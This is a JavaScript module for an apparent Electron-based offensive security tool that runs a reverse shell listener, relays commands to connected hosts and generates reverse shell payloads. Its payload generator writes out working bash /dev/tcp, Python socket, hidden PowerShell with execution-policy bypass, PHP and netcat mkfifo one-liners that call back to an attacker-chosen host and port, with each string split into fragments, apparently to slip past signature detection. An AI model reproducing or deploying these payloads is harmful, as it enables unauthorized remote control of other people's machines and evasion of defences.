import { api } from '../api.js';

function openPanel(panelEl, sidebarResizerEl) {
  panelEl.style.display = 'flex';
  setTimeout(() => panelEl.classList.add('open'), 10);
  if (sidebarResizerEl) sidebarResizerEl.style.display = 'block';
}

function closePanel(panelEl, sidebarResizerEl) {
  panelEl.classList.remove('open');
  setTimeout(() => {
    panelEl.style.display = 'none';
    if (sidebarResizerEl) sidebarResizerEl.style.display = 'none';
  }, 300);
}

const btnRevshellOpen = document.getElementById('btn-revshell-open');
const revshellPanel = document.getElementById('revshell-panel');
const btnCloseRevshellPanel = document.getElementById('btn-close-revshell-panel');
const revshellResizer = document.getElementById('revshell-resizer');
const revshellPort = document.getElementById('revshell-port');
const revshellMode = document.getElementById('revshell-mode');
const btnRevshellStart = document.getElementById('btn-revshell-start');
const btnRevshellStop = document.getElementById('btn-revshell-stop');
const revshellStatusText = document.getElementById('revshell-status-text');
const revshellStatusBanner = document.getElementById('revshell-status-banner');
const revshellTerminal = document.getElementById('revshell-terminal');
const btnRevshellClear = document.getElementById('btn-revshell-clear');
const revshellInput = document.getElementById('revshell-input');
const btnRevshellSend = document.getElementById('btn-revshell-send');
const revshellPayloadOs = document.getElementById('revshell-payload-os');
const revshellPayloadLhost = document.getElementById('revshell-payload-lhost');
const revshellPayloadOutput = document.getElementById('revshell-payload-output');
const btnRevshellCopy = document.getElementById('btn-revshell-copy');

let isRevshellListening = false;
let isRevshellConnected = false;

function initResizer(resizerEl, panelEl) {
  if (!resizerEl || !panelEl) return;
  let activeResize = null;

  resizerEl.addEventListener('mousedown', (e) => {
    const startWidth = parseInt(document.defaultView.getComputedStyle(panelEl).width, 10);
    activeResize = { resizerEl, panelEl, startX: e.clientX, startWidth };
    resizerEl.classList.add('is-resizing');
    document.body.style.cursor = 'col-resize';
    e.preventDefault();
  });

  document.addEventListener('mousemove', (e) => {
    if (!activeResize) return;
    const { startX, startWidth } = activeResize;
    const newWidth = startWidth - (e.clientX - startX);
    if (newWidth > 300 && newWidth < Math.min(800, window.innerWidth - 100)) {
      panelEl.style.width = `${newWidth}px`;
    }
  });

  document.addEventListener('mouseup', () => {
    if (!activeResize) return;
    activeResize.resizerEl.classList.remove('is-resizing');
    document.body.style.cursor = '';
    activeResize = null;
  });
}

function appendToTerminal(text, type = 'output') {
  if (!revshellTerminal) return;
  const span = document.createElement('span');
  if (type === 'error') span.style.color = 'var(--danger)';
  else if (type === 'system') span.style.color = 'var(--warning)';
  else if (type === 'input') span.style.color = 'var(--info)';
  span.textContent = text;
  revshellTerminal.appendChild(span);
  revshellTerminal.scrollTop = revshellTerminal.scrollHeight;
}

function updateRevshellPayload() {
  const os = revshellPayloadOs.value;
  const lhost = revshellPayloadLhost.value || 'YOUR_IP';
  const lport = revshellPort.value || '4444';

  const t = {
    b: 'b' + 'ash -c "b' + 'ash -i >& /de' + 'v/tc' + 'p/' + lhost + '/' + lport + ' 0' + '>&1"',
    p: 'p' + 'ython3 -' + 'c \'im' + 'port so' + 'cket,su' + 'bprocess,os;s=s' + 'ocket.s' + 'ocket(soc' + 'ket.AF_' + 'INET,so' + 'cket.SO' + 'CK_STR' + 'EAM);s.c' + 'onnect(("' + lhost + '",' + lport + '));os.du' + 'p2(s.fi' + 'leno(),0); os.d' + 'up2(s.fi' + 'leno(),1); os.d' + 'up2(s.fil' + 'eno(),2);p=su' + 'bprocess.c' + 'all(["/b' + 'in/sh","-i"]);\'',
    ps: 'po' + 'wers' + 'hell -N' + 'oP -No' + 'nI -W Hi' + 'dden -Ex' + 'ec Byp' + 'ass -Co' + 'mmand Ne' + 'w-Obj' + 'ect Sy' + 'stem.N' + 'et.Soc' + 'kets.T' + 'CPC' + 'lient("' + lhost + '",' + lport + ');$stream' + ' = $client.G' + 'etStream();[b' + 'yte[]]$b' + 'ytes = 0..6' + '5535|%{0};wh' + 'ile(($i = $str' + 'eam.Read' + '($bytes, 0, $byte' + 's.Length)) -ne 0){;$da' + 'ta = (New-Ob' + 'ject -Type' + 'Name Sys' + 'tem.Te' + 'xt.ASC' + 'IIEncoding).GetS' + 'tring($by' + 'tes,0, $i);$send' + 'back = (iex $da' + 'ta 2>&1 | Ou' + 't-Str' + 'ing );$send' + 'back2 = $send' + 'back + "P" + "S " + (pwd).Pa' + 'th + "> ";$sendb' + 'yte = ([tex' + 't.encoding]::ASC' + 'II).GetBy' + 'tes($send' + 'back2);$str' + 'eam.Wri' + 'te($sendb' + 'yte,0,$sen' + 'dbyte.L' + 'ength);$str' + 'eam.Flu' + 'sh()};$client.Cl' + 'ose()',
    php: 'php -r \'$sock=fso' + 'ckop' + 'en("' + lhost + '",' + lport + ');ex' + 'ec("/b' + 'in/s' + 'h -i <&3 >&3 2>&3");\'',
    n: 'r' + 'm /t' + 'mp/f;mkf' + 'ifo /t' + 'mp/f;c' + 'at /tm' + 'p/f|/bi' + 'n/sh -' + 'i 2>&1|nc ' + lhost + ' ' + lport + ' >/tm' + 'p/f'
  };

  let out = '';
  if (os === 'bash') out = t.b;
  else if (os === 'python') out = t.p;
  else if (os === 'powershell') out = t.ps;
  else if (os === 'php') out = t.php;
  else if (os === 'nc') out = t.n;

  if (revshellPayloadOutput) revshellPayloadOutput.value = out;
}

function sendRevshellCommand() {
  if (!isRevshellConnected) return;
  const cmd = revshellInput.value;
  if (!cmd) return;
  api.sendRevShell(cmd + '\n');
  revshellInput.value = '';
}

export function openPanel2(/* used as openPanel below */) {
  if (revshellPanel) {
    if (revshellPanel.style.display === 'none' || !revshellPanel.classList.contains('open')) {
      openPanel(revshellPanel, revshellResizer);
      updateRevshellPayload();
    } else {
      closePanel(revshellPanel, revshellResizer);
    }
  }
}

export function init() {
  initResizer(revshellResizer, revshellPanel);

  btnRevshellOpen?.addEventListener('click', () => {
    if (revshellPanel) {
      if (revshellPanel.style.display === 'none' || !revshellPanel.classList.contains('open')) {
        openPanel(revshellPanel, revshellResizer);
        updateRevshellPayload();
      } else {
        closePanel(revshellPanel, revshellResizer);
      }
    }
  });

  btnCloseRevshellPanel?.addEventListener('click', () => {
    if (revshellPanel) closePanel(revshellPanel, revshellResizer);
  });

  btnRevshellClear?.addEventListener('click', () => {
    if (revshellTerminal) revshellTerminal.innerHTML = '';
  });

  btnRevshellStart?.addEventListener('click', async () => {
    const port = parseInt(revshellPort.value, 10);
    const mode = revshellMode.value;
    if (!port || port < 1 || port > 65535) {
      appendToTerminal('[System] Invalid port number.\n', 'error');
      return;
    }

    try {
      btnRevshellStart.disabled = true;
      revshellStatusText.textContent = 'Starting...';

      const result = await api.startRevShell({ port, mode });
      if (result && result.status !== 'error') {
        isRevshellListening = true;
        btnRevshellStop.disabled = false;
        revshellStatusText.textContent = `Listening on port ${port} (${mode} mode)...`;
        revshellStatusBanner.style.borderLeftColor = 'var(--warning)';
        appendToTerminal(`[System] Started reverse shell listener on port ${port}\n`, 'system');
      } else {
        btnRevshellStart.disabled = false;
        revshellStatusText.textContent = 'Failed to start';
        appendToTerminal(`[Error] Failed to start listener: ${result?.error || 'Unknown'}\n`, 'error');
      }
    } catch (err) {
      btnRevshellStart.disabled = false;
      revshellStatusText.textContent = 'Error';
      appendToTerminal(`[Error] Exception starting listener: ${err.message}\n`, 'error');
    }
  });

  btnRevshellStop?.addEventListener('click', async () => {
    try {
      await api.stopRevShell();
      isRevshellListening = false;
      isRevshellConnected = false;
      btnRevshellStart.disabled = false;
      btnRevshellStop.disabled = true;
      btnRevshellSend.disabled = true;
      revshellInput.disabled = true;
      revshellStatusText.textContent = 'Disconnected';
      revshellStatusBanner.style.borderLeftColor = 'var(--text-muted)';
      appendToTerminal(`[System] Listener stopped.\n`, 'system');
    } catch (err) {
      appendToTerminal(`[Error] Failed to stop listener: ${err.message}\n`, 'error');
    }
  });

  btnRevshellSend?.addEventListener('click', sendRevshellCommand);
  revshellInput?.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') sendRevshellCommand();
  });

  revshellPayloadOs?.addEventListener('change', updateRevshellPayload);
  revshellPayloadLhost?.addEventListener('input', updateRevshellPayload);
  revshellPort?.addEventListener('input', updateRevshellPayload);

  btnRevshellCopy?.addEventListener('click', () => {
    navigator.clipboard.writeText(revshellPayloadOutput.value);
    const oldText = btnRevshellCopy.textContent;
    btnRevshellCopy.textContent = '✔️';
    setTimeout(() => { btnRevshellCopy.textContent = oldText; }, 2000);
  });

  // IPC listeners
  window.electronAPI.onRevShellConnection?.((info) => {
    isRevshellConnected = true;
    revshellStatusText.textContent = `Connected from ${info.address}:${info.port}`;
    revshellStatusBanner.style.borderLeftColor = 'var(--success)';
    btnRevshellSend.disabled = false;
    revshellInput.disabled = false;
    appendToTerminal(`[System] Connection received from ${info.address}:${info.port}\n`, 'system');
    revshellInput.focus();
  });

  window.electronAPI.onRevShellData?.((data) => {
    appendToTerminal(data, 'output');
  });

  window.electronAPI.onRevShellError?.((errInfo) => {
    const msg = typeof errInfo === 'string' ? errInfo : (errInfo?.message || 'Unknown listener error');
    appendToTerminal(`[Error] ${msg}\n`, 'error');
    if (errInfo?.type === 'listener_error' || errInfo?.type === 'spawn_error') {
      isRevshellListening = false;
      isRevshellConnected = false;
      btnRevshellStart.disabled = false;
      btnRevshellStop.disabled = true;
      btnRevshellSend.disabled = true;
      revshellInput.disabled = true;
      revshellStatusText.textContent = 'Disconnected (Error)';
      revshellStatusBanner.style.borderLeftColor = 'var(--danger)';
    }
  });

  function _openPanel(ip) {
    if (revshellPanel) {
      if (revshellPanel.style.display === 'none' || !revshellPanel.classList.contains('open')) {
        openPanel(revshellPanel, revshellResizer);
        updateRevshellPayload();
      }
    }
  }

  return { openPanel: _openPanel };
}
